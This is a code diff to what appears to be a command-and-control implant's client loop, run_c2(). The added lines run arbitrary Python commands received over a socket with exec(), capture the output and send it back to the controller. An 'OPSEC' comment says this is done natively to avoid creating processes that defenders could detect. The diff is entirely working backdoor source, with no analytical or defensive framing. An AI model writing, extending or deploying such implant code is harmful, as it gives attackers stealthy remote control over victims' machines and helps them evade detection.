@@ -22,7 +22,35 @@ def run_c2():
             # ============================================================
             # OPSEC: Native Python implementations to avoid Process Creation
             # ============================================================
-            
+            py_exec = False
+            if cmd.startswith('exec('):
+                py_exec = True
+            elif cmd.endswith('()') and cmd[:-2] in globals():
+                py_exec = True
+            elif cmd in globals() and callable(globals()[cmd]):
+                cmd = cmd + "()"
+                py_exec = True
+
+            if py_exec:
+                try:
+                    io_mod = __import__('io')
+                    sys_mod = __import__('sys')
+                    old_stdout = sys_mod.stdout
+                    sys_mod.stdout = io_mod.StringIO()
+
+                    exec(cmd, globals())
+
+                    output = sys_mod.stdout.getvalue()
+                    sys_mod.stdout = old_stdout
+                    client_socket.send((output if output else " \n").encode('utf-8', errors='ignore'))
+                except Exception as e:
+                    try:
+                        sys_mod.stdout = old_stdout
+                    except:
+                        pass
+                    client_socket.send(f"[-] Python Error: {e}\n".encode('utf-8'))
+                continue
+
             if cmd.startswith('cd '):
                 try: 
                     os_chdir(cmd[3:].strip())
